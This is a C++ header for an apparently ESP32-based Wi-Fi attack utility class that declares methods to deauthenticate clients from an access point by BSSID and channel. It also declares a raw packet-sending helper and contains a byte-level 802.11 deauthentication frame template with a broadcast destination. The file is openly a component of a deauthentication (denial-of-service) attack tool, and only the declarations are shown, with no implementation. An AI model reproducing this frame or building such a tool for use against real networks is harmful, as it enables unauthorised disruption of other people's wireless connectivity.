//
// Created by l-sha on 10/7/2025.
//

#pragma once

#include <WiFi.h>

typedef uint8_t MacAddr[6];

class WifiAttackUtility
{
public:
  WifiAttackUtility();
  ~WifiAttackUtility();
  esp_err_t deauthenticate(const MacAddr bssid, uint8_t channel);
  esp_err_t deauthenticate(const MacAddr ap, const MacAddr bssid, uint8_t channel);

private:
  esp_err_t change_channel(uint8_t channel) noexcept;
  esp_err_t send_packet(const uint8_t* packet, size_t len) noexcept;

  uint16_t sequence_number = 0;
  const uint8_t deauth_frame_default[26] = {
    0xc0, 0x00,                           // Frame Control + Flags
    0x3a, 0x01,                           // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Destination MAC (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source MAC (to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID (to be filled)
    0xf0, 0xff,                           // Sequence Control
    0x02, 0x00                            // Reason Code
  };

  uint8_t deauth_frame[sizeof(deauth_frame_default)];
};